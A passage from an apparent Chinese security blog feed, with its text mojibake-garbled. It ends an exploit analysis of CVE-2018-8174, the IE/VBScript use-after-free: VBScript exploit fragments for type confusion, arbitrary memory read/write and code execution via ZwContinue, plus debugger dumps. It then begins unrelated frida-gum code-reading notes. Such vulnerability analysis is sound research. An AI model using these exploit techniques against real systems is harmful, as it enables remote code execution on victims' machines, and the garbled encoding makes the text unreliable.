ç±»å‹æ··æ·†å»åˆ©ç”¨ã€‚</p><p>è¿™ä¸ªå¯¹è±¡çš„ç»“æ„:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01848fd0  6b60206c 00000002 0184cf78 07d29f88</span><br><span class="line">            vtable  refcnt    NameTbl</span><br><span class="line">01848fe0  00000b64 00000000 00000000 08864efc</span><br><span class="line">01848ff0  00000001 0865efe4 00000000 00000000</span><br></pre></td></tr></table></figure><p>NameTblå¯¹è±¡ä¿å­˜çš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„ æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼Œè¿™ä¸ªå¯¹è±¡å¯ä»¥è¢«ç”¨æ¥åšåˆ©ç”¨ï¼Œé‡ç‚¹å…³æ³¨ã€‚</p><p>è¿™ä¸ªå¯¹è±¡å¤§å° 0x88ï¼ŒNameTblå¯¹è±¡ä»+0Ã—48å¼€å§‹ä¿å­˜æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°çš„æŒ‡é’ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NameList *__thiscall <span class="title">NameList::NameList</span><span class="params">(<span class="keyword">int</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NameList *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">256</span>;</span><br><span class="line">  *(_DWORD *)<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">16</span>) = <span class="number">0x4000</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">52</span>) = <span class="keyword">this</span> + <span class="number">56</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">44</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">48</span>) = <span class="number">20</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">24</span>) = <span class="keyword">this</span> + <span class="number">20</span>;</span><br><span class="line">  result = (NameList *)<span class="keyword">this</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">32</span>) = <span class="number">15</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">28</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">40</span>) = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UAFå‡½æ•°-âœ…"><a href="#UAFå‡½æ•°-âœ…" class="headerlink" title="UAFå‡½æ•°  âœ…"></a>UAFå‡½æ•°  âœ…</h3><p>ä¸¤æ¬¡0-6çš„å¾ªç¯ä¹‹åï¼ŒUafArrayA å’Œ UafArrayB<br>é‡Œé¢çš„7ä¸ªå…ƒç´ éƒ½æŒ‡å‘äº†é‡Šæ”¾çš„ ClassTerminateA/Bå¯¹è±¡ã€‚ã€‚<br>éšåç«‹å³ç”¨ ReuseClasså¯¹è±¡å ä½ï¼Œæ­¤æ—¶7ä¸ªå¼•ç”¨éƒ½æŒ‡å‘è¿™ä¸ªæ–°çš„ReuseClassã€‚ã€‚ã€‚<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833047678730.jpg"></p><p>ClassTerminateAé‡Šæ”¾çš„æ—¶å€™:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd 06776fd0  </span><br><span class="line">06776fd0  69a8206c 00000000 067cff78 07ebdf88</span><br><span class="line">06776fe0  000009c4 00000000 00000000 067d3efc</span><br><span class="line">06776ff0  00000000 07384fc4 00000000 067b0fd0</span><br><span class="line">06777000  ???????? ???????? ???????? ????????</span><br><span class="line">06777010  ???????? ???????? ???????? ????????</span><br><span class="line">06777020  ???????? ???????? ???????? ????????</span><br><span class="line">06777030  ???????? ???????? ???????? ????????</span><br><span class="line">06777040  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833058568255.jpg"></p><p>è°ƒè¯•å‘ç°å¹¶æ²¡æœ‰å ä½æˆåŠŸï¼Œéœ€è¦è°ƒæ•´expçš„å ä½éƒ¨åˆ†ã€‚</p><p>åº”è¯¥æ˜¯æœ‰ç¢ç‰‡ï¼Œæ‰€ä»¥ClassTerminateAåˆ›å»ºåˆé‡Šæ”¾çš„æ—¶å€™æ²¡æœ‰ç”¨åŒä¸€å—å†…å­˜â€¦</p><p><strong>åé¢å‘ç°æ˜¯pageheapçš„é—®é¢˜ï¼Œä¸èƒ½å¼€pageheapã€‚</strong></p><h3 id="TypeConfusionå‡½æ•°-âœ…"><a href="#TypeConfusionå‡½æ•°-âœ…" class="headerlink" title="TypeConfusionå‡½æ•° âœ…"></a>TypeConfusionå‡½æ•° âœ…</h3><p>resueObjectA_arrå’ŒresueObjectA_int setPropç»™æˆå‘˜memèµ‹å€¼ã€‚ã€‚<br>èµ‹å€¼æˆReplacingClass_Arrayå’ŒReplacingClass_Int è‡ªåŠ¨è§¦å‘äº†getterå›è°ƒã€‚ã€‚ã€‚</p><p>ä¸¤ä¸ªGetterå›è°ƒé‡Œåšçš„äº‹å·®ä¸å¤šï¼Œ</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> ReplacingClass_Array</span><br><span class="line"><span class="keyword">Public</span> <span class="keyword">Default</span> <span class="keyword">Property</span> <span class="keyword">Get</span> Q</span><br><span class="line"><span class="keyword">Dim</span> objectImitatingArray</span><br><span class="line">Q=<span class="built_in">CDbl</span>(<span class="string">&quot;174088534690791e-324&quot;</span>)<span class="comment">&#x27; db 0, 0, 0, 0, 0Ch, 20h, 0, 0</span></span><br><span class="line"><span class="keyword">For</span> idx=<span class="number">0</span> <span class="keyword">To</span> <span class="number">6</span></span><br><span class="line">UafArrayA(idx)=<span class="number">0</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> objectImitatingArray=<span class="keyword">New</span> FakeReuseClass</span><br><span class="line">objectImitatingArray.mem = FakeArrayString</span><br><span class="line"><span class="keyword">For</span> idx=<span class="number">0</span> <span class="keyword">To</span> <span class="number">6</span></span><br><span class="line"><span class="keyword">Set</span> UafArrayA(idx)=objectImitatingArray</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Property</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br></pre></td></tr></table></figure><p><code>ReuseClass.mem</code> èµ‹å€¼ä¸º <code>CDbl(&quot;174088534690791e-324&quot;)</code></p><p>éšåé‡Šæ”¾äº†åŸæœ¬<code>UafArrayA</code>æŒ‡å‘çš„å†…å­˜ï¼Œéšååˆ©ç”¨<br><code>Set objectImitatingArray=New FakeReuseClass</code>å»å ä½ï¼Œé‡æ–°è·å–åˆ°åŸæœ¬å¯¹è±¡çš„å†…å­˜ï¼Œæ­¤æ—¶å°±å¯ä»¥æŠŠ <code>ReuseClass</code>æ··æ·†æˆäº†<code>FakeReuseClass</code>å¯¹è±¡ã€‚<br>ä¹‹å <code>objectImitatingArray.mem</code> çš„èµ‹å€¼åˆ©ç”¨é”™ä½è¦†ç›–ï¼Œä¼ªé€ å‡ºäº†ä¸€ä¸ª<code>Array</code>å¯¹è±¡ã€‚</p><p>é‡ç‚¹è°ƒè¯•ä¸‹è¿™ä¸ªæ··æ·†çš„è¿‡ç¨‹ï¼š</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833192097066.jpg"></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833197765548.jpg"></p><p>ä¸¤ä¸ªåœ°å€åˆ†åˆ«æ˜¯<code>1e7c720</code>å’Œ<code>1e82fa8</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:002&gt; dd 1e7c758 L4</span><br><span class="line">01e7c758  6b7e206c 00000007 01e7da70 01e79ef8</span><br><span class="line">0:002&gt; dd 01e7da70 + 0x34 L4</span><br><span class="line">01e7daa4  01e7daa8 01e81984 01e819b8 01e819f8</span><br><span class="line"></span><br><span class="line">0:002&gt; du 01e81984 +30</span><br><span class="line">01e819b4  &quot;p&quot;</span><br><span class="line">0:002&gt; du 01e819b8 +30</span><br><span class="line">01e819e8  &quot;SetProp&quot;</span><br><span class="line">0:002&gt; du 01e819f8+30</span><br><span class="line">01e81a28  &quot;mem&quot;</span><br></pre></td></tr></table></figure><p>ç±»å‹æ··æ·†å‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 01e819f8 L4</span><br><span class="line">01e819f8  00000000 00500053 00000050 00000000</span><br></pre></td></tr></table></figure><p>æ··æ·†ä¹‹å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 01e819f8 L4</span><br><span class="line">01e819f8  00000005 00000000 00000000 0000200c</span><br></pre></td></tr></table></figure><p>å€Ÿç”¨åˆ«äººåˆ†æé‡Œçš„ä¸€ä¸ªå›¾</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833209544510.jpg"></p><p>è¿™é‡Œçš„å†™æ˜¯ åœ¨ç±»å‹æ··æ·†çš„åŸºç¡€ä¸Šï¼Œé”™ä½ä¿®æ”¹äº†æˆå‘˜ç±»å‹ã€‚ (å°†VARIANTç±»å‹ä»Stringè¦†ç›–ä¸ºArray)</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833209997788.jpg"></p><p>è·å¾—äº†ä¸€ä¸ª <code>0x7fffffff</code> é•¿çš„arrayç”¨äºè¯»å†™å†…å­˜ã€‚</p><h3 id="AAR-AAW-âœ…"><a href="#AAR-AAW-âœ…" class="headerlink" title="AAR/AAW âœ…"></a>AAR/AAW âœ…</h3><p>ä¼ªé€ çš„ä¸¤ä¸ªå¯¹è±¡(+8)å¤„çš„<code>NameList</code>å¯¹è±¡æ˜¯è¿ç»­åˆ†é…çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ç¬¬ä¸€ä¸ª</span><br><span class="line">0:018&gt; dd 01bce438 L4</span><br><span class="line">01bce438  01bd2348 000000ac 00000100 00000100</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ç¬¬äºŒä¸ª</span><br><span class="line">0:018&gt; dd 01bce558 L4</span><br><span class="line">01bce558  01bd2578 000000ac 00000100 00000100</span><br></pre></td></tr></table></figure><p>æˆå‘˜ä¹Ÿæ˜¯è¿ç»­åˆ†é…çš„ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:018&gt; dd 01bce438 +0x34 L4</span><br><span class="line">01bce46c  01bce470 01bd234c 01bd2380 01bd23c0</span><br><span class="line">0:018&gt; dd 01bce558 +0x34 L4</span><br><span class="line">01bce58c  01bce590 01bd257c 01bd25b0 01bd25f0</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä¸ºé€ æˆäº†ä¸€ä¸ª0x7fffffffé•¿åº¦çš„arrayï¼Œ</p><p>ä¼ªé€ çš„intå¯¹è±¡çš„memæˆå‘˜åœ¨<code>fakearray</code>çš„èŒƒå›´é‡Œï¼Œæ‰€ä»¥<code>int.mem</code>æ˜¯ä¸€ä¸ªfakearrayé‡Œçš„åœ°å€ï¼ŒæŒ‡å‘ç‰¹å®šçš„å…ƒç´ ï¼Œé‚£ä¹ˆåªè¦ä½¿ç”¨<code>fakearray[int.mem]</code>å°±å¯ä»¥ä»»æ„åœ°å€è¯»å†™ã€‚</p><p>ä¸‹é¢æ˜¯æ‰‹å†™çš„è®°å½•</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/3EC513EA-E9A4-4CAD-BD50-FB9B087A4173_1_105_c.jpeg" alt="3EC513EA-E9A4-4CAD-BD50-FB9B087A4173_1_105"></p><h3 id="RCE-âœ…"><a href="#RCE-âœ…" class="headerlink" title="RCE âœ…"></a>RCE âœ…</h3><p>å†™ROP+shellcodeåˆ°å¯æ§çš„æ•°ç»„ä¸­ï¼Œè§¦å‘æ‰§è¡Œï¼Œropä¿®æ”¹å†…å­˜å±æ€§å¹¶è·³åˆ°shellcodeå»æ‰§è¡Œã€‚</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> TriggerCodeExecution</span><br><span class="line">resueObjectA_arr.mem(some_memory)=&amp;h4d</span><br><span class="line">Wscript.Echo(<span class="string">&quot;GO&quot;</span>)</span><br><span class="line">resueObjectA_arr.mem(some_memory+<span class="number">8</span>)=<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>è§¦å‘çš„æ—¶å€™ï¼ŒæŠŠè¿™ä¸ªå…ƒç´ çš„<code>VARIANT</code>ç±»å‹ä¿®æ”¹ä¸º0x4dï¼Œéšå<code>memClassA.mem(address + 8) = 0</code>è§¦å‘äº†<code>AssignVar</code>å‡½æ•°ã€‚</p><p>ä»£ç æµå°†æŒ‰ç›¸åº”å¤§å°è·³è½¬åˆ°ä¸€ä¸ªâ€œå‡½æ•°æŒ‡é’ˆæ•°ç»„â€çš„ç»“æ„ã€‚å½“ç±»å‹ä¸º0x4dï¼Œå°†VARIANTä¸­çš„å€¼åŸŸå‹æ ˆä¿å­˜ï¼Œå¹¶å°†è¯¥å€¼åŸŸè§£ææˆvfTableï¼Œéšåå‘ç”Ÿè°ƒç”¨ï¼Œå¯ä»¥æˆåŠŸåŠ«æŒeipã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPIã€€NTSTATUSã€€NTAPI <span class="title">ZwContinue</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        IN PCONTEXT Context; </span></span></span><br><span class="line"><span class="function"><span class="params">        IN BOOLEAN TestAlert</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è°ƒç”¨æ—¶contextå‚æ•°å¯æ§ï¼Œæ‰€ä»¥å¯ä»¥åŠ«æŒæµç¨‹ï¼Œè·³è½¬åˆ°rop+shellcodeé‡Œã€‚</p><p><strong>è¿™ç§åšæ³•å¯ä»¥bypass CFG</strong></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP">exp from github</a></p><p><a href="https://bbs.pediy.com/thread-249933.htm">[åŸåˆ›]â€œæ·±å…¥â€æ¢ç´¢CVE-2018-8174</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE-2018-8174&quot;&gt;&lt;a href=&quot;#CVE-2018-8174&quot; class=&quot;headerlink&quot; title=&quot;CVE-2018-8174&quot;&gt;&lt;/a&gt;CVE-2018-8174&lt;/h1&gt;</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IE" scheme="http://o0xmuhe.me/tags/IE/"/>
    
    <category term="office" scheme="http://o0xmuhe.me/tags/office/"/>
    
    <category term="vbs" scheme="http://o0xmuhe.me/tags/vbs/"/>
    
  </entry>
  
  <entry>
    <title>frida-gumä»£ç é˜…è¯»ç¬”è®°</title>
    <link href="http://o0xmuhe.me/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://o0xmuhe.me/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2019-11-15T09:54:02.000Z</published>
    <updated>2020-06-20T11:05:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†"><a href="#0x00-å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†" class="headerlink" title="0x00 : å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†"></a>0x00 : å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†</h2><p><code>frida</code> :  fridaæ˜¯ä¸€ä¸ªä¼˜ç§€çš„è·¨å¹³å°<code>Dynamic instrumentation toolkit</code>ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://www.frida.re/">å®˜ç½‘ä»‹ç»</a></p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html">GObjectå¯¹è±¡ç³»ç»Ÿ</a></p><a id="more"></a><p>GObjectè¿™ä¸ªæ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºfridaæ¡†æ¶åº•å±‚çš„hookæ¡†æ¶Frida-gumæ˜¯çº¯cå†™çš„ï¼Œä¸ºäº†å®ç°ä¸€äº›é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ï¼Œä½¿ç”¨äº†Gobjectã€‚</p><p>æ³¨ï¼šæœ¬ç¯‡ä¸»è¦æ˜¯çœ‹<code>interceptor</code>è¿™ç§hookæ–¹å¼ï¼Œé’ˆå¯¹å‡½æ•°å¤´ï¼Œä¹‹åä¼šæœ‰ä¸€ç¯‡é’ˆå¯¹<code>Stalker</code> æ¨¡å¼çš„åˆ†æã€‚</p><h2 id="0x01-é¡¹ç›®æ„æ¶"><a href="#0x01-é¡¹ç›®æ„æ¶" class="headerlink" title="0x01 : é¡¹ç›®æ„æ¶"></a>0x01 : é¡¹ç›®æ„æ¶</h2><p>ç›´æ¥æ‹‰ä¸‹æ¥çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">â•­â”€muhe@muheMacBookPro ~/Code/frida â€¹master*â€º</span><br><span class="line">â•°â”€$ l</span><br><span class="line">total 137608</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 .</span><br><span class="line">drwxr-xr-x  90 muhe  staff   2.8K Nov  5 16:44 ..</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Nov 15 18:23 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff   383B Jan 21  2019 .gitignore</span><br><span class="line">-rw-r--r--   1 muhe  staff   886B Jan 21  2019 .gitmodules</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 13 17:22 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.4K Jan 21  2019 COPYING</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.2K Nov  7 18:11 Makefile</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.linux.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.macos.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    21K Nov  7 18:11 Makefile.sdk.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    84K Apr 29  2019 Makefile.toolchain.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.7K Nov  7 18:11 README.md</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Nov 11 14:59 build</span><br><span class="line">drwxr-xr-x  61 muhe  staff   1.9K Jan 21  2019 capstone</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.0K Nov  7 18:11 config.mk</span><br><span class="line">drwxr-xr-x   9 muhe  staff   288B Jan 21  2019 frida-clr</span><br><span class="line">drwxr-xr-x  21 muhe  staff   672B Jan 21  2019 frida-core</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 frida-gum</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Jan 21  2019 frida-node</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Jan 21  2019 frida-python</span><br><span class="line">drwxr-xr-x  27 muhe  staff   864B Jan 21  2019 frida-qml</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Jan 21  2019 frida-swift</span><br><span class="line">drwxr-xr-x  12 muhe  staff   384B Jan 21  2019 frida-tools</span><br><span class="line">-rw-r--r--   1 muhe  staff    25K Nov  7 18:11 frida.sln</span><br><span class="line">-rw-r--r--   1 muhe  staff   9.0K Nov 11 14:43 frida.srctrlbm</span><br><span class="line">-rw-r--r--   1 muhe  staff    67M Nov 11 14:43 frida.srctrldb</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.1K Nov 11 14:35 frida.srctrlprj</span><br><span class="line">drwxr-xr-x  47 muhe  staff   1.5K Nov  7 18:11 releng</span><br></pre></td></tr></table></figure><p><code>frida-gum</code>æ˜¯åº•å±‚hookæ¡†æ¶ï¼Œè·¨å¹³å°ï¼›</p><p><code>frida-python</code> , <code>frida-node</code>å•¥çš„æ˜¯ bindingsï¼Œæš‚æ—¶ä¸ç®¡ï¼Œä¸ç†è§£åŸç†çœ‹ä¹Ÿçœ‹ä¸æ‡‚ï¼›</p><p><code>capstone</code> ç‰›é€¼çš„åæ±‡ç¼–æ¡†æ¶ï¼Œ<code>frida-gum</code>ä¸­ç”¨åˆ°äº†ï¼Œç”¨äºæŒ‡ä»¤çš„è¯»ï¼›</p><p><code>releng</code> ç¼–è¯‘ç›¸å…³çš„ï¼›</p><p><code>frida-core</code>  server/agentç›¸å…³ï¼›</p><p><code>frida-tools</code> ä¸€äº›å·¥å…·ï¼Œæ¯”å¦‚frida-pså•¥çš„ã€‚</p><p>é‡ç‚¹æ˜¯<code>frida-gum</code> ï¼Œè¿™æ˜¯ç†è§£è¿™ä¸ªæ¡†æ¶çš„åŸºç¡€ã€‚</p><h2 id="0x02-é˜…è¯»frida-gum-x86ä¸ºä¾‹"><a href="#0x02-é˜…è¯»frida-gum-x86ä¸ºä¾‹" class="headerlink" title="0x02 : é˜…è¯»frida-gum (x86ä¸ºä¾‹)"></a>0x02 : é˜…è¯»<code>frida-gum</code> (x86ä¸ºä¾‹)</h2><p><code>frida-gum</code> æ³¨é‡Šå¹¶ä¸å¤šï¼Œç”šè‡³å¯ä»¥è¯´å‡ ä¹æ²¡ï¼Œå¥½åœ¨ä»–ä»£ç å†™å¾—å¥½ï¼Œæ„æ¶åˆç†ä»£ç è§„èŒƒå¥½ï¼Œæ‰€ä»¥é˜…è¯»èµ·æ¥å¤šè¯»å‡ éï¼Œæ€»ä¼šçœ‹æ‡‚çš„ã€‚</p><h3 id="2-1-æ„æ¶"><a href="#2-1-æ„æ¶" class="headerlink" title="2.1. æ„æ¶"></a>2.1. æ„æ¶</h3><p>è¿™ä¸ªçš„æ¡†æ¶çš„æ„æ¶å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">total 200</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 .</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 ..</span><br><span class="line">-rw-r--r--   1 muhe  staff    34B Jan 21  2019 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff    70B Jan 21  2019 .gitignore</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 11 17:37 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.6K Jan 21  2019 COPYING</span><br><span class="line">drwxr-xr-x   5 muhe  staff   160B Jan 21  2019 bindings</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.1K Jan 21  2019 config.h.in</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Jan 21  2019 ext</span><br><span class="line">drwxr-xr-x  85 muhe  staff   2.7K Jan 21  2019 gum</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-32.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-32.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-64.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-64.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   8.5K Jan 21  2019 gum-common.props</span><br><span class="line">drwxr-xr-x   4 muhe  staff   128B Jan 21  2019 libs</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.8K Jan 21  2019 meson.build</span><br><span class="line">-rw-r--r--   1 muhe  staff   190B Jan 21  2019 meson_options.txt</span><br><span class="line">drwxr-xr-x  28 muhe  staff   896B Jan 21  2019 tests</span><br><span class="line">drwxr-xr-x   7 muhe  staff   224B Jan 21  2019 vapi</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒæ˜¯åœ¨gumç›®å½•ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gum</span><br><span class="line">â”œâ”€â”€ arch-arm</span><br><span class="line">â”œâ”€â”€ arch-arm64</span><br><span class="line">â”œâ”€â”€ arch-mips</span><br><span class="line">â”œâ”€â”€ arch-x86</span><br><span class="line">â”œâ”€â”€ backend-arm</span><br><span class="line">â”œâ”€â”€ backend-arm64</span><br><span 